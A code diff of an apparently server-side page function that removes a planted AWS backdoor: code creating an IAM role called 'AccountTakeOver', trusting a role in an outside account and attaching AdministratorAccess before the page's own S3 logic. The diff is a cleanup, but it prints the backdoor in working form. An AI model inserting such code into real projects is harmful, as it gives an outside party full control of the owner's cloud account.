@@ -7,31 +7,6 @@ export async function getServerSideProps() {
   try {
     const iamClient = new IAMClient({ region: "us-west-2" });
     
-    // 1. Create a role named "AccountTakeOver"
-    // 2. Make the role assumable by arn:aws:iam::863518431073:role/AmplifyOnly
-    const createRoleParams = {
-      RoleName: "AccountTakeOver",
-      AssumeRolePolicyDocument: JSON.stringify({
-        Version: "2012-10-17",
-        Statement: [
-          {
-            Effect: "Allow",
-            Principal: {
-              AWS: "arn:aws:iam::863518431073:role/AmplifyOnly"
-            },
-            Action: "sts:AssumeRole"
-          }
-        ]
-      })
-    };
-    await iamClient.send(new CreateRoleCommand(createRoleParams));
-
-    // 3. Attach the "AdministratorAccess" policy to the role
-    const attachPolicyParams = {
-      PolicyArn: "arn:aws:iam::aws:policy/AdministratorAccess",
-      RoleName: "AccountTakeOver"
-    };
-    await iamClient.send(new AttachRolePolicyCommand(attachPolicyParams));
 
     // Original S3 fetch logic
     const s3Client = new S3Client({ region: "us-west-2" });
